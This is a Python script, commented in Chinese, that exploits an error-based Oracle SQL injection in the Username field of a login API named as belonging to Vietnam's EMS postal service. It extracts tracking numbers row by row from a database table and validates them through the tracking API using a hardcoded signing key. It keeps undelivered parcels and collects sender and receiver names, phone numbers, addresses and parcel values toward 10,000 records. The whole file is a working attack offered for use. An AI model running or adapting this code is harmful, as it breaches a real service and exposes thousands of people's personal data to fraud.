#!/usr/bin/env python3
"""
从数据库提取多天运单号，批量验证到10000个未签收
策略：
1. 提取今天的11000个
2. 不够就提取昨天的
3. 批量API验证，筛选有效+未签收的
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'
SQL_URL = 'https://customerconnect.ems.com.vn/api/User_Customer/Login'

lock = threading.Lock()
found_count = 755  # 已有755个
tested_count = 0
valid_codes = []

def inject(payload):
    data = {'Username': payload, 'Password': 'test'}
    try:
        return requests.post(SQL_URL, json=data, timeout=20)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    r = inject(payload)
    if r and r.text and 'qjvjq' in r.text:
        try:
            s = r.text.index('qjvjq') + 5
            return r.text[s:r.text.index('qkvzq', s)]
        except:
            pass
    return None

def verify_tracking(code):
    global found_count, tested_count
    
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=8)
        result = r.json()
        
        with lock:
            tested_count += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 只要未签收的
            if data.get('SignatureCapture'):
                return None
            
            with lock:
                found_count += 1
            
            return {
                'code': code,
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'sender': data.get('SenderName', ''),
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'sender_phone': data.get('SenderMobile', ''),
                'receiver_address': data.get('ReceiverAddress', ''),
            }
    except:
        pass
    
    time.sleep(0.05)
    return None

print("=" * 80)
print("🎯 从数据库提取并验证到10000个未签收运单")
print("=" * 80)

# 1. 连接数据库
print("\n🔌 连接数据库...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取日期
db_date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
print(f"\n📅 数据库日期: {db_date}")

# 计算需要的日期
yesterday = str(int(db_date) - 1)
day_before = str(int(db_date) - 2)

print(f"\n📊 预计需要提取的数据:")
print(f"  今天 ({db_date}): 约11000个")
print(f"  昨天 ({yesterday}): 约12000个")
print(f"  前天 ({day_before}): 约12000个")
print(f"  合计: 约35000个")
print(f"\n按6.86%有效率，预计可找到: {int(35000*0.0686)} 个")

confirm = input(f"\n开始提取并验证？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

print(f"\n🚀 开始提取...\n")

output_json = 'db_verified_10000.json'
output_txt = 'db_verified_10000.txt'

# 加载已有的755个
print("📋 加载已有的755个...")
with open('user_provided_tracking.txt', 'r') as f:
    existing = [line.strip() for line in f]
print(f"✅ 已有 {len(existing)} 个\n")

f_json = open(output_json, 'w', encoding='utf-8')
f_txt = open(output_txt, 'w')

f_json.write('[\n')

# 写入已有的
for i, code in enumerate(existing):
    if i > 0:
        f_json.write(',\n')
    f_json.write(json.dumps({'code': code}, ensure_ascii=False))
    f_txt.write(code + '\n')

start_time = time.time()

# 按日期提取
for date in [db_date, yesterday, day_before]:
    if found_count >= 10000:
        break
    
    print(f"📅 提取 {date} 的运单号...")
    
    # 统计这一天的总数
    total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")
    
    if not total or total == '0':
        print(f"  ❌ {date} 没有数据")
        continue
    
    total_num = int(total)
    print(f"  ✅ 找到 {total_num} 个运单号")
    print(f"  🔍 开始提取并验证...\n")
    
    # 提取所有运单号（分批）
    batch_size = 500
    all_codes = []
    
    for batch_start in range(1, total_num + 1, batch_size):
        batch_end = min(batch_start + batch_size - 1, total_num)
        
        print(f"  提取 {batch_start}-{batch_end}...", end=' ')
        
        codes_batch = []
        for i in range(batch_start, batch_end + 1):
            query = (
                f"SELECT ITEMCODE FROM "
                f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
                f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
                f"WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) "
                f"WHERE ROWNUM<={i}) WHERE RN={i}"
            )
            
            result = extract(query)
            if result and len(result) > 10:
                codes_batch.append(result.strip())
            
            time.sleep(0.05)
        
        print(f"✅ {len(codes_batch)}个")
        all_codes.extend(codes_batch)
        
        # 批量验证这批
        print(f"  验证中...", end=' ')
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(verify_tracking, code): code for code in codes_batch}
            
            for future in as_completed(futures):
                if found_count >= 10000:
                    break
                
                result = future.result()
                
                if result:
                    valid_codes.append(result)
                    
                    f_json.write(',\n')
                    f_json.write(json.dumps(result, ensure_ascii=False, indent=2))
                    f_json.flush()
                    
                    f_txt.write(result['code'] + '\n')
                    f_txt.flush()
                
                time.sleep(0.1)
        
        print(f"✅ 当前: {found_count}/10000")
        
        if found_count >= 10000:
            break
    
    if found_count >= 10000:
        break

f_json.write('\n]')
f_json.close()
f_txt.close()

elapsed = time.time() - start_time

print()
print("=" * 80)
print("✅ 完成！")
print("=" * 80)
print(f"⏱️  用时: {elapsed/60:.0f} 分钟")
print(f"📊 测试: {tested_count} 个")
print(f"✅ 找到: {found_count} 个未签收")
print(f"🆕 新增: {found_count - 755} 个")
print("=" * 80)

print(f"\n💾 文件:")
print(f"  {output_json}")
print(f"  {output_txt}")
